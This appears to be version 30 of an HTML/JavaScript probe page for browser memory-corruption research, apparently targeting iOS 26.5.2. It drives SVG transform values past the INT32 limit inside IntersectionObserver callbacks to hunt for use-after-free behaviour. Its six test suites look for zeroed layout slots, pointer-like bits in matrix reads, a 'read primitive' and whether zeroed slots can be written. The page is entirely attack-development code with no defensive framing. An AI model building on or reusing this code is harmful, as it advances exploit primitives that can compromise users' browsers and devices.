<!DOCTYPE html>
<html>
<head>
<meta charset="utf-8">
<title>SVG v30 — IO Slot Exhaustion Probe</title>
<style>
*{box-sizing:border-box;margin:0;padding:0}
body{background:#0a0a0a;color:#ccc;font-family:monospace;font-size:11px;padding:12px}
h1{color:#fff;font-size:13px;margin-bottom:3px}
h2{color:#555;font-size:9px;text-transform:uppercase;letter-spacing:.12em;margin-bottom:8px}
.suite{background:#111;border:1px solid #1e1e1e;border-radius:4px;padding:10px;margin-bottom:8px}
.result{padding:4px 8px;border-radius:2px;margin-bottom:2px;font-size:11px;word-break:break-all}
.pass{background:#081208;border-left:3px solid #0c0;color:#0c0}
.fail{background:#120808;border-left:3px solid #f00;color:#f44}
.warn{background:#121000;border-left:3px solid #aa0;color:#cc0}
.info{background:#0c0c0c;border-left:2px solid #2a2a2a;color:#666}
.star{background:#08081a;border-left:3px solid #66f;color:#99f}
.crit{background:#160a00;border-left:3px solid #f80;color:#fc8;font-weight:bold}
.uaf{background:#1a0000;border-left:4px solid #f00;color:#ff3333;font-weight:bold;font-size:12px;padding:6px 10px}
.zero{background:#1a001a;border-left:4px solid #f0f;color:#f8f;font-weight:bold;padding:5px 8px}
.hdr{color:#444;font-size:9px;text-transform:uppercase;letter-spacing:.08em;padding:2px 0 4px;border-bottom:1px solid #1a1a1a;margin-bottom:6px}
button{background:#0e0e0e;color:#0d0;border:1px solid #0d0;padding:4px 10px;font-family:monospace;font-size:10px;cursor:pointer;border-radius:2px;margin:0 3px 4px 0}
button:active{background:#0d0;color:#000}
#btn-all{border-color:#cc0;color:#cc0}
#btn-copy{border-color:#888;color:#888}
#progress{color:#555;font-size:10px;padding:4px 0;min-height:16px}
</style>
</head>
<body>
<h1>SVG v30 — IntersectionObserver Slot Exhaustion</h1>
<h2>iOS 26.5.2 · IOS / IOD / IOC / IOM / IOX / IOW</h2>

<div class="suite">
<button id="btn-all" onclick="runAll()">▶ ALL</button>
<button onclick="go('IOS')">IOS</button>
<button onclick="go('IOD')">IOD</button>
<button onclick="go('IOC')">IOC</button>
<button onclick="go('IOM')">IOM</button>
<button onclick="go('IOX')">IOX</button>
<button onclick="go('IOW')">IOW</button>
<button id="btn-copy" onclick="copyAll()">⎘ Copy</button>
<button onclick="clearOut()">✕</button>
</div>
<div class="suite"><div id="progress"></div><div id="out"></div></div>

<script>
var NS='http://www.w3.org/2000/svg';
var LU_MAX=33554432;
var INT32_MAX=2147483647;
var INT32_OVF=2147483648;

function log(m,c){
  var d=document.getElementById('out');
  var e=document.createElement('div');
  e.className='result '+(c||'info');
  e.textContent=m;
  d.appendChild(e);
  e.scrollIntoView({block:'nearest'});
}
function prog(m){document.getElementById('progress').textContent=m;}
function hdr(m){log(m,'hdr');}
function clearOut(){document.getElementById('out').innerHTML='';prog('');}
function copyAll(){
  var lines=[];
  document.querySelectorAll('#out .result').forEach(function(e){lines.push(e.textContent);});
  navigator.clipboard&&navigator.clipboard.writeText(lines.join('\n'));
}
function go(s){clearOut();window['run'+s]();}
function runAll(){
  clearOut();
  runIOS();
  setTimeout(function(){runIOD();},1500);
  setTimeout(function(){runIOC();},3000);
  setTimeout(function(){runIOM();},4500);
  setTimeout(function(){runIOX();},6000);
  setTimeout(function(){runIOW();},7500);
}

var _fb=new ArrayBuffer(8);
var _dv=new Float64Array(_fb);
var _uv=new Uint32Array(_fb);
function f64hex(f){_dv[0]=f;return'0x'+_uv[1].toString(16).padStart(8,'0')+'_'+_uv[0].toString(16).padStart(8,'0');}
function f64hi(f){_dv[0]=f;return _uv[1];}
function f64lo(f){_dv[0]=f;return _uv[0];}

function mkSVG(w,h,vb){
  var s=document.createElementNS(NS,'svg');
  s.setAttribute('width',w||100);s.setAttribute('height',h||100);
  if(vb)s.setAttribute('viewBox',vb);
  s.style.cssText='position:absolute;left:-9999px;top:-9999px';
  document.body.appendChild(s);
  return s;
}
function mkRect(parent,x,y,w,h){
  var r=document.createElementNS(NS,'rect');
  r.setAttribute('x',x||0);r.setAttribute('y',y||0);
  r.setAttribute('width',w||10);r.setAttribute('height',h||10);
  parent.appendChild(r);
  return r;
}
function getMX(el){
  el.setAttribute('transform','matrix(1 0 0 1 0 0)');
  return el.transform.baseVal.getItem(0).matrix;
}
function bcr(el){try{return el.getBoundingClientRect();}catch(e){return null;}}
function ctm(el){try{return el.getScreenCTM();}catch(e){return null;}}

// ════════════════════════════════════════════════════════════════════════
// IOS — slot exhaustion threshold: find the EXACT batch size that triggers zeros
// test batch sizes: 1,2,4,8,16,32,48,56,60,62,63,64,65,66,68,72,80,96,128,200
// ════════════════════════════════════════════════════════════════════════
function runIOS(){
  hdr('IOS: slot exhaustion threshold — find exact batch size that triggers zeros');

  var batchSizes=[1,2,4,8,16,32,48,56,60,62,63,64,65,66,68,72,80,96,128,200];
  var bi=0;

  function testBatch(batchSize, done){
    var svg=mkSVG(100,100);
    var rects=[];
    var mxs=[];
    for(var i=0;i<batchSize;i++){
      var r=mkRect(svg,0,0,10,10);
      getMX(r);
      mxs.push(r.transform.baseVal.getItem(0).matrix);
      rects.push(r);
    }
    mxs.forEach(function(m){m.e=INT32_MAX;});

    var zeros=[];var negs=[];var fired=0;
    var ios=[];

    rects.forEach(function(r,idx){
      var io=new IntersectionObserver(function(entries){
        fired++;
        mxs[idx].e=INT32_OVF;
        var b=bcr(r);
        var bx=b?b.x:null;
        if(bx===0||bx===null)zeros.push(idx);
        else if(bx!==null&&bx<0)negs.push({idx:idx,bx:bx});

        if(fired===batchSize){
          // all callbacks fired
          io.disconnect();
          ios.forEach(function(o){try{o.disconnect();}catch(e){}});
          svg.remove();
          done(zeros,negs,batchSize);
        }
      });
      ios.push(io);
      io.observe(r);
    });

    // Trigger all observations by making elements visible
    rects.forEach(function(r){
      r.style.cssText='position:fixed;left:0;top:0;width:10px;height:10px;opacity:0.01';
    });

    // timeout fallback
    setTimeout(function(){
      if(fired<batchSize){
        ios.forEach(function(o){try{o.disconnect();}catch(e){}});
        svg.remove();
        done(zeros,negs,batchSize);
      }
    },300);
  }

  function nextBatch(){
    if(bi>=batchSizes.length){
      prog('IOS done');
      return;
    }
    var bs=batchSizes[bi++];
    prog('IOS: testing batch='+bs);
    testBatch(bs,function(zeros,negs,size){
      var zeroRate=size>0?(zeros.length/size*100).toFixed(1):'0';
      log('IOS: batch='+size+' zeros='+zeros.length+' negs='+negs.length+' rate='+zeroRate+'%',
        (negs.length>0?'uaf — NEGATIVES at batch='+size:
         zeros.length>0?'zero — ZEROS at batch='+size+': indices=['+zeros.slice(0,5).join(',')+
           (zeros.length>5?'...':'')+']':
         'pass'));
      setTimeout(nextBatch,100);
    });
  }
  nextBatch();
}

// ════════════════════════════════════════════════════════════════════════
// IOD — determinism: is it always the same element indices that zero?
// run the same batch 10 times and check if zero indices are stable
// ════════════════════════════════════════════════════════════════════════
function runIOD(){
  hdr('IOD: determinism — are the zero indices stable across runs?');

  var BATCH=200;
  var RUNS=10;
  var run=0;
  var allZeroSets=[];

  function doRun(){
    if(run>=RUNS){
      prog('IOD done');
      // compare zero sets across runs
      var allSame=true;
      var ref=allZeroSets[0]?allZeroSets[0].join(','):'';
      for(var i=1;i<allZeroSets.length;i++){
        if(allZeroSets[i].join(',')!==ref){allSame=false;break;}
      }
      log('IOD: '+RUNS+' runs of batch='+BATCH+'. zero sets identical='+allSame,
        allSame?'zero — DETERMINISTIC: same indices every run':'warn — VARIABLE zero indices');
      allZeroSets.forEach(function(z,i){
        log('IOD: run '+i+': zeros=['+z.slice(0,10).join(',')+
          (z.length>10?'...+'+( z.length-10)+'more':'')+'] count='+z.length,'info');
      });
      // IOD[2]: what are the zero indices? consecutive? modular?
      if(allZeroSets[0]&&allZeroSets[0].length>0){
        var z0=allZeroSets[0];
        var consecutive=true;
        for(var j=1;j<z0.length;j++){if(z0[j]!==z0[j-1]+1){consecutive=false;break;}}
        log('IOD: zero indices are '+(consecutive?'CONSECUTIVE from '+z0[0]+' to '+z0[z0.length-1]:'NON-consecutive'),
          consecutive?'zero — consecutive block of zeros: first='+z0[0]+' last='+z0[z0.length-1]:'info');
        // check if modular: every N-th element
        if(!consecutive&&z0.length>1){
          var gaps=[];
          for(var k=1;k<Math.min(z0.length,10);k++)gaps.push(z0[k]-z0[k-1]);
          log('IOD: gaps between zero indices: '+gaps.join(','),'info');
        }
      }
      return;
    }

    prog('IOD: run '+run+'/'+RUNS);
    var svg=mkSVG(100,100);
    var rects=[],mxs=[];
    for(var i=0;i<BATCH;i++){
      var r=mkRect(svg,0,0,10,10);
      getMX(r);
      mxs.push(r.transform.baseVal.getItem(0).matrix);
      rects.push(r);
    }
    mxs.forEach(function(m){m.e=INT32_MAX;});

    var zeros=[],fired=0,ios=[];
    rects.forEach(function(r,idx){
      var io=new IntersectionObserver(function(entries){
        fired++;
        mxs[idx].e=INT32_OVF;
        var b=bcr(r);
        var bx=b?b.x:null;
        if(bx===0||bx===null)zeros.push(idx);
        if(fired===BATCH){
          ios.forEach(function(o){try{o.disconnect();}catch(e){}});
          svg.remove();
          allZeroSets.push(zeros.slice().sort(function(a,b){return a-b;}));
          run++;
          setTimeout(doRun,50);
        }
      });
      ios.push(io);
      io.observe(r);
    });
    rects.forEach(function(r){
      r.style.cssText='position:fixed;left:0;top:0;width:10px;height:10px;opacity:0.01';
    });
    setTimeout(function(){
      if(fired<BATCH){
        ios.forEach(function(o){try{o.disconnect();}catch(e){}});
        svg.remove();
        allZeroSets.push(zeros.slice().sort(function(a,b){return a-b;}));
        run++;
        setTimeout(doRun,50);
      }
    },400);
  }
  doRun();
}

// ════════════════════════════════════════════════════════════════════════
// IOC — CTM at zero: when BCR.x=0, does CTM give a non-zero value?
// if CTM.e != 0 while BCR.x == 0, we have two different reads from
// potentially two different struct pointers — one zeroed, one not
// ════════════════════════════════════════════════════════════════════════
function runIOC(){
  hdr('IOC: BCR=0 vs CTM divergence — two different struct reads?');

  var BATCH=200;
  var svg=mkSVG(100,100);
  var rects=[],mxs=[];
  for(var i=0;i<BATCH;i++){
    var r=mkRect(svg,0,0,10,10);
    getMX(r);
    mxs.push(r.transform.baseVal.getItem(0).matrix);
    rects.push(r);
  }
  mxs.forEach(function(m){m.e=INT32_OVF;});  // start on OVF path

  var fired=0,ios=[];
  var zeroBCRnonzeroCTM=[];  // BCR=0 but CTM≠0 — two different reads
  var zeroBoth=[];           // both zero
  var nonZero=[];            // neither zero — normal

  rects.forEach(function(r,idx){
    var io=new IntersectionObserver(function(){
      fired++;
      // DON'T mutate this time — element already at INT32_OVF
      // just read both BCR and CTM and compare
      var b=bcr(r);
      var c=ctm(r);
      var bx=b?b.x:null;
      var ce=c?c.e:null;

      if(bx===0&&ce!==0&&ce!==null){
        zeroBCRnonzeroCTM.push({idx:idx,bx:bx,ce:ce,cf:c?c.f:null,
          hiCE:f64hi(ce),loCE:f64lo(ce)});
      } else if(bx===0&&(ce===0||ce===null)){
        zeroBoth.push({idx:idx,ce:ce});
      } else {
        nonZero.push({idx:idx,bx:bx,ce:ce});
      }

      if(fired===BATCH){
        ios.forEach(function(o){try{o.disconnect();}catch(e){}});
        svg.remove();
        prog('IOC done');

        log('IOC[1]: batch='+BATCH+'. BCR=0+CTM≠0='+zeroBCRnonzeroCTM.length+
          ' bothZero='+zeroBoth.length+' normal='+nonZero.length,
          (zeroBCRnonzeroCTM.length>0?'uaf — BCR=0 BUT CTM≠0: DIVERGENT STRUCT READS!':
           zeroBoth.length>0?'zero — BOTH ZERO: single zeroed path':'pass'));

        if(zeroBCRnonzeroCTM.length>0){
          zeroBCRnonzeroCTM.slice(0,5).forEach(function(z,i){
            log('IOC[1]: hit #'+i+': idx='+z.idx+' BCR.x='+z.bx+' CTM.e='+z.ce+
              ' CTM.f='+z.cf,'uaf — DIVERGENCE');
            log('IOC[1]:   CTM.e bits: hi=0x'+z.hiCE.toString(16)+' lo=0x'+z.loCE.toString(16),
              (z.hiCE>0&&z.hiCE<0xffff0000?'uaf — POINTER-LIKE HI BITS IN CTM.e AT ZERO BCR!':'zero'));
          });
        }

        // IOC[2]: try to read CTM fields (a,b,c,d,e,f) all at once when BCR=0
        hdr('IOC[2]: full CTM matrix read at exact zero slot');
        if(zeroBoth.length>0||zeroBCRnonzeroCTM.length>0){
          // rerun with explicit full matrix read
          iocFullMatrix();
        } else {
          log('IOC[2]: no zeros captured — rerun with mutation variant','warn');
          iocMutationVariant();
        }
      }
    });
    ios.push(io);
    io.observe(r);
  });
  rects.forEach(function(r){
    r.style.cssText='position:fixed;left:0;top:0;width:10px;height:10px;opacity:0.01';
  });
  setTimeout(function(){
    if(fired<BATCH){
      ios.forEach(function(o){try{o.disconnect();}catch(e){}});
      svg.remove();
      log('IOC[1]: timeout — only '+fired+'/'+BATCH+' fired','warn');
      iocMutationVariant();
    }
  },500);

  function iocFullMatrix(){
    hdr('IOC[2]: full matrix at zero — all 6 CTM fields');
    var BATCH2=200;
    var svg2=mkSVG(100,100);
    var rects2=[],mxs2=[];
    for(var i=0;i<BATCH2;i++){
      var r2=mkRect(svg2,0,0,10,10);
      getMX(r2);
      mxs2.push(r2.transform.baseVal.getItem(0).matrix);
      rects2.push(r2);
    }
    mxs2.forEach(function(m){m.e=INT32_OVF;});

    var fired2=0,ios2=[];
    var hits2=[];
    rects2.forEach(function(r2,idx){
      var io2=new IntersectionObserver(function(){
        fired2++;
        mxs2[idx].e=INT32_OVF;
        var b2=bcr(r2);
        var c2=ctm(r2);
        var bx=b2?b2.x:null;
        if(bx===0||bx===null){
          hits2.push({
            idx:idx,
            bcr:{x:b2?b2.x:null,y:b2?b2.y:null,w:b2?b2.width:null,h:b2?b2.height:null,r:b2?b2.right:null,bot:b2?b2.bottom:null},
            ctm:{a:c2?c2.a:null,b:c2?c2.b:null,c:c2?c2.c:null,d:c2?c2.d:null,e:c2?c2.e:null,f:c2?c2.f:null}
          });
        }
        if(fired2===BATCH2){
          ios2.forEach(function(o){try{o.disconnect();}catch(e){}});
          svg2.remove();
          log('IOC[2]: full matrix hits: '+hits2.length,'info');
          hits2.slice(0,3).forEach(function(h,i){
            log('IOC[2]: hit #'+i+' BCR=['+h.bcr.x+','+h.bcr.y+','+h.bcr.w+','+h.bcr.h+']',
              (h.bcr.x===0&&h.bcr.y===0&&h.bcr.w===0?'zero — ENTIRE BCR ZEROED':
               h.bcr.x===0&&h.bcr.w!==0?'crit — x=0 but dims nonzero: w='+h.bcr.w:'zero'));
            log('IOC[2]: hit #'+i+' CTM=[a='+h.ctm.a+' b='+h.ctm.b+' c='+h.ctm.c+' d='+h.ctm.d+' e='+h.ctm.e+' f='+h.ctm.f+']',
              (h.ctm.e!==0&&h.ctm.e!==null?'uaf — CTM.e≠0 WHILE BCR.x=0!':
               h.ctm.a!==0&&h.ctm.a!==null?'star — CTM.a≠0 at zero: '+h.ctm.a:'zero'));
          });
        }
      });
      ios2.push(io2);
      io2.observe(r2);
    });
    rects2.forEach(function(r2){
      r2.style.cssText='position:fixed;left:0;top:0;width:10px;height:10px;opacity:0.01';
    });
    setTimeout(function(){
      if(fired2<BATCH2){ios2.forEach(function(o){try{o.disconnect();}catch(e){}});svg2.remove();}
    },500);
  }

  function iocMutationVariant(){
    // use mutation (like v29 that confirmed zeros) to capture CTM at zero moment
    hdr('IOC[3]: mutation variant — switch to OVF inside IO callback');
    var BATCH3=200;
    var svg3=mkSVG(100,100);
    var rects3=[],mxs3=[];
    for(var i=0;i<BATCH3;i++){
      var r3=mkRect(svg3,0,0,10,10);
      getMX(r3);
      mxs3.push(r3.transform.baseVal.getItem(0).matrix);
      rects3.push(r3);
    }
    mxs3.forEach(function(m){m.e=INT32_MAX;});  // start LU path

    var fired3=0,ios3=[];
    var zeroBCR=[],nonzeroCTMwhenZeroBCR=[];
    rects3.forEach(function(r3,idx){
      var io3=new IntersectionObserver(function(){
        fired3++;
        mxs3[idx].e=INT32_OVF;  // switch to OVF inside callback
        var b3=bcr(r3);
        var c3=ctm(r3);
        var bx=b3?b3.x:null;
        var ce=c3?c3.e:null;
        if(bx===0||bx===null){
          zeroBCR.push(idx);
          if(ce!==0&&ce!==null)nonzeroCTMwhenZeroBCR.push({idx:idx,ce:ce,cf:c3?c3.f:null});
        }
        if(fired3===BATCH3){
          ios3.forEach(function(o){try{o.disconnect();}catch(e){}});
          svg3.remove();
          log('IOC[3]: mutation variant. zeroBCR='+zeroBCR.length+' CTM≠0@zeroBCR='+nonzeroCTMwhenZeroBCR.length,
            (nonzeroCTMwhenZeroBCR.length>0?'uaf — BCR=0 BUT CTM≠0 IN MUTATION VARIANT!':
             zeroBCR.length>0?'zero — BCR zeros confirmed, CTM also 0':'pass — no zeros this run'));
          if(nonzeroCTMwhenZeroBCR.length>0){
            nonzeroCTMwhenZeroBCR.slice(0,3).forEach(function(v,i){
              log('IOC[3]:   diverge #'+i+': idx='+v.idx+' CTM.e='+v.ce+' bits='+f64hex(v.ce),'uaf');
            });
          }
        }
      });
      ios3.push(io3);
      io3.observe(r3);
    });
    rects3.forEach(function(r3){
      r3.style.cssText='position:fixed;left:0;top:0;width:10px;height:10px;opacity:0.01';
    });
    setTimeout(function(){
      if(fired3<BATCH3){ios3.forEach(function(o){try{o.disconnect();}catch(e){}});svg3.remove();}
    },500);
  }
}

// ════════════════════════════════════════════════════════════════════════
// IOM — multi-SVG: do zeros spread to unrelated SVG elements?
// create SVG A (being mutated) and SVG B (completely separate, not mutated)
// run batch of 200 callbacks — does SVG B's element also return zero BCR?
// ════════════════════════════════════════════════════════════════════════
function runIOM(){
  hdr('IOM: multi-SVG isolation — does zero spread to unrelated elements?');

  var BATCH=150;
  var svgA=mkSVG(100,100);  // will be mutated
  var svgB=mkSVG(100,100);  // untouched, control group

  var rectsA=[],mxsA=[];
  var rectsB=[];  // no matrix mutation — simple rects

  // fill A with mutating elements
  for(var i=0;i<BATCH;i++){
    var rA=mkRect(svgA,0,0,10,10);
    getMX(rA);
    mxsA.push(rA.transform.baseVal.getItem(0).matrix);
    rectsA.push(rA);
  }
  mxsA.forEach(function(m){m.e=INT32_MAX;});

  // fill B with plain elements (no transform mutation)
  for(var j=0;j<50;j++){
    rectsB.push(mkRect(svgB,0,0,10,10));
  }

  var firedA=0,firedB=0;
  var zerosA=[],zerosB=[],negsB=[];
  var iosA=[],iosB=[];

  // observe A (mutating batch)
  rectsA.forEach(function(rA,idx){
    var io=new IntersectionObserver(function(){
      firedA++;
      mxsA[idx].e=INT32_OVF;
      var b=bcr(rA);
      if(b&&(b.x===0||b.x===null))zerosA.push(idx);
      if(firedA===BATCH){checkDone();}
    });
    iosA.push(io);
    io.observe(rA);
  });

  // observe B (control, no mutation) — interleaved with A's observers
  rectsB.forEach(function(rB,idx){
    var io=new IntersectionObserver(function(){
      firedB++;
      var b=bcr(rB);
      var bx=b?b.x:null;
      if(bx===0||bx===null)zerosB.push(idx);
      if(bx!==null&&bx<0)negsB.push({idx:idx,bx:bx});
      if(firedB===rectsB.length){checkDone();}
    });
    iosB.push(io);
    io.observe(rB);
  });

  function checkDone(){
    if(firedA<BATCH||firedB<rectsB.length)return;
    iosA.forEach(function(o){try{o.disconnect();}catch(e){}});
    iosB.forEach(function(o){try{o.disconnect();}catch(e){}});
    svgA.remove();svgB.remove();
    prog('IOM done');
    log('IOM[1]: mutating batch A (n='+BATCH+'): zeros='+zerosA.length,'info');
    log('IOM[1]: control group B (n='+rectsB.length+'): zeros='+zerosB.length+' negatives='+negsB.length,
      (negsB.length>0?'uaf — CONTROL GROUP NEGATIVES: zero spreads to unrelated SVG!':
       zerosB.length>0?'zero — CONTROL GROUP ZEROS: zero spreads across SVG boundary!':
       'pass — zeros contained to mutating batch'));
    if(zerosB.length>0){
      log('IOM[1]: B zero indices: ['+zerosB.join(',')+']','zero — CROSS-SVG CONTAMINATION');
    }

    // IOM[2]: what if B elements also have INT32_OVF transform?
    hdr('IOM[2]: B elements with INT32_OVF — does slot exhaust affect them too?');
    var svgC=mkSVG(100,100);
    var rectsC=[],mxsC=[];
    for(var k=0;k<50;k++){
      var rC=mkRect(svgC,0,0,10,10);
      getMX(rC);
      mxsC.push(rC.transform.baseVal.getItem(0).matrix);
      rectsC.push(rC);
    }
    mxsC.forEach(function(m){m.e=INT32_OVF;});  // already on OVF path

    var firedC=0,zerosC=[],iosC=[];
    rectsC.forEach(function(rC,idx){
      var io=new IntersectionObserver(function(){
        firedC++;
        var b=bcr(rC);
        if(b&&b.x===0)zerosC.push(idx);
        if(firedC===rectsC.length){
          iosC.forEach(function(o){try{o.disconnect();}catch(e){}});
          svgC.remove();
          log('IOM[2]: C batch (OVF, n='+rectsC.length+'): zeros='+zerosC.length,
            zerosC.length>0?'zero — OVF-PRESET ALSO ZEROS IN OBSERVER!':'pass');
        }
      });
      iosC.push(io);
      io.observe(rC);
    });
    rectsC.forEach(function(rC){
      rC.style.cssText='position:fixed;left:0;top:0;width:10px;height:10px;opacity:0.01';
    });
    setTimeout(function(){
      if(firedC<rectsC.length){iosC.forEach(function(o){try{o.disconnect();}catch(e){}});svgC.remove();}
    },400);
  }

  // trigger both sets
  rectsA.forEach(function(r){r.style.cssText='position:fixed;left:0;top:0;width:10px;height:10px;opacity:0.01';});
  rectsB.forEach(function(r){r.style.cssText='position:fixed;left:1px;top:0;width:10px;height:10px;opacity:0.01';});

  setTimeout(function(){
    if(firedA<BATCH||firedB<rectsB.length){
      iosA.forEach(function(o){try{o.disconnect();}catch(e){}});
      iosB.forEach(function(o){try{o.disconnect();}catch(e){}});
      svgA.remove();svgB.remove();
      log('IOM: timeout firedA='+firedA+'/'+BATCH+' firedB='+firedB+'/'+rectsB.length,'warn');
    }
  },600);
}

// ════════════════════════════════════════════════════════════════════════
// IOX — IO + viewBox: trigger zero while element has viewBox amplification
// BCR should be ~2B (amplified) but when slot exhausts it zeros
// Does CTM still show the amplified value even when BCR is 0?
// ════════════════════════════════════════════════════════════════════════
function runIOX(){
  hdr('IOX: viewBox amplification + IO slot exhaust — CTM vs BCR at zero');

  var BATCH=200;
  // viewBox 0 0 0.01 0.01 → 1 SVG unit = 10000px
  var svg=mkSVG(100,100,'0 0 0.01 0.01');
  var rects=[],mxs=[];
  for(var i=0;i<BATCH;i++){
    var r=mkRect(svg,0,0,0.001,0.001);
    getMX(r);
    mxs.push(r.transform.baseVal.getItem(0).matrix);
    rects.push(r);
  }
  // set to 214749 SVG units × 10000px = ~2.147B px (past INT32)
  mxs.forEach(function(m){m.e=214749;});

  var fired=0,ios=[];
  var results=[];

  rects.forEach(function(r,idx){
    var io=new IntersectionObserver(function(){
      fired++;
      var b=bcr(r);
      var c=ctm(r);
      var bx=b?b.x:null;
      var ce=c?c.e:null;
      results.push({idx:idx,bx:bx,ce:ce});

      if(fired===BATCH){
        ios.forEach(function(o){try{o.disconnect();}catch(e){}});
        svg.remove();
        prog('IOX done');

        var zeros=results.filter(function(v){return v.bx===0||v.bx===null;});
        var negs=results.filter(function(v){return v.bx!==null&&v.bx<0;});
        var diverg=results.filter(function(v){return (v.bx===0||v.bx===null)&&v.ce!==0&&v.ce!==null;});

        log('IOX[1]: batch='+BATCH+' viewBox=0.01. zeros='+zeros.length+' negs='+negs.length+' BCR=0+CTM≠0='+diverg.length,
          (diverg.length>0?'uaf — viewBox+IO: BCR=0 BUT CTM SHOWS AMPLIFIED VALUE!':
           negs.length>0?'uaf — NEGATIVE IN VIEWBOX IO!':
           zeros.length>0?'zero — viewBox zeros in IO (CTM also 0)':
           'pass'));

        if(diverg.length>0){
          diverg.slice(0,3).forEach(function(v,i){
            log('IOX[1]: diverge #'+i+': idx='+v.idx+' BCR.x='+v.bx+' CTM.e='+v.ce+
              ' (amplified≈2.147B)','uaf — READ PRIMITIVE AT ZERO SLOT!');
          });
        }

        // also report some normal values for comparison
        var normals=results.filter(function(v){return v.bx!==0&&v.bx!==null&&v.bx>0;});
        if(normals.length>0){
          log('IOX[1]: sample normal: BCR.x='+normals[0].bx+' CTM.e='+normals[0].ce,'info');
        }
      }
    });
    ios.push(io);
    io.observe(r);
  });
  rects.forEach(function(r){
    r.style.cssText='position:fixed;left:0;top:0;width:10px;height:10px;opacity:0.01';
  });
  setTimeout(function(){
    if(fired<BATCH){ios.forEach(function(o){try{o.disconnect();}catch(e){}});svg.remove();
      log('IOX: timeout fired='+fired+'/'+BATCH,'warn');}
  },600);
}

// ════════════════════════════════════════════════════════════════════════
// IOW — write after zero: if we can reliably hit the zero slot,
// can we write to it? Set a property AFTER the BCR=0 read,
// then re-read — does the value stick or is it zeroed again?
// Also: can we forge a BCR value by writing to a zeroed slot?
// ════════════════════════════════════════════════════════════════════════
function runIOW(){
  hdr('IOW: write-after-zero — probe if zeroed slot is writable');

  var BATCH=200;
  var svg=mkSVG(100,100);
  var rects=[],mxs=[];
  for(var i=0;i<BATCH;i++){
    var r=mkRect(svg,0,0,10,10);
    getMX(r);
    mxs.push(r.transform.baseVal.getItem(0).matrix);
    rects.push(r);
  }
  mxs.forEach(function(m){m.e=INT32_MAX;});

  var fired=0,ios=[];
  var zeroHits=[];

  rects.forEach(function(r,idx){
    var io=new IntersectionObserver(function(){
      fired++;
      mxs[idx].e=INT32_OVF;
      var b1=bcr(r);
      var bx=b1?b1.x:null;

      if(bx===0||bx===null){
        // ZERO SLOT HIT — now probe it
        var c1=ctm(r);

        // Try: write a DIFFERENT matrix value and immediately re-read
        mxs[idx].e=12345;  // small, distinctive value
        var b2=bcr(r);
        var c2=ctm(r);

        // Try: force style change and re-read
        r.setAttribute('width','20');
        var b3=bcr(r);

        // Try: remove + re-add the element
        var parent=r.parentNode;
        parent.removeChild(r);
        parent.appendChild(r);
        var b4=bcr(r);
        var c4=ctm(r);

        zeroHits.push({
          idx:idx,
          b1:{x:b1?b1.x:null,y:b1?b1.y:null},
          c1:{e:c1?c1.e:null,f:c1?c1.f:null},
          b2:{x:b2?b2.x:null},  // after writing e=12345
          c2:{e:c2?c2.e:null},
          b3:{x:b3?b3.x:null},  // after width change
          b4:{x:b4?b4.x:null},  // after re-attach
          c4:{e:c4?c4.e:null},
        });
      }

      if(fired===BATCH){
        ios.forEach(function(o){try{o.disconnect();}catch(e){}});
        svg.remove();
        prog('IOW done');

        log('IOW[1]: zero hits='+zeroHits.length+'/'+BATCH,
          zeroHits.length>0?'zero — zero slots captured':'pass — no zeros');

        zeroHits.slice(0,3).forEach(function(z,i){
          log('IOW[1]: hit #'+i+' idx='+z.idx,'info');
          log('IOW[1]:   b1(zero)=['+z.b1.x+','+z.b1.y+'] ctm1.e='+z.c1.e,'zero');
          log('IOW[1]:   b2(e=12345)='+z.b2.x+' ctm2.e='+z.c2.e,
            (z.b2.x!==0&&z.b2.x!==null?'crit — WRITE TO ZEROED SLOT RECOVERED VALUE! b2='+z.b2.x:'zero'));
          log('IOW[1]:   b3(width=20)='+z.b3.x,
            (z.b3.x!==0&&z.b3.x!==null?'crit — ATTR CHANGE RECOVERED FROM ZERO! b3='+z.b3.x:'zero'));
          log('IOW[1]:   b4(re-attach)='+z.b4.x+' ctm4.e='+z.c4.e,
            (z.b4.x!==0&&z.b4.x!==null?'star — RE-ATTACH RECOVERED: b4='+z.b4.x+' ctm='+z.c4.e:'zero'));
        });
      }
    });
    ios.push(io);
    io.observe(r);
  });
  rects.forEach(function(r){
    r.style.cssText='position:fixed;left:0;top:0;width:10px;height:10px;opacity:0.01';
  });
  setTimeout(function(){
    if(fired<BATCH){ios.forEach(function(o){try{o.disconnect();}catch(e){}});svg.remove();
      log('IOW: timeout fired='+fired+'/'+BATCH,'warn');}
  },600);
}
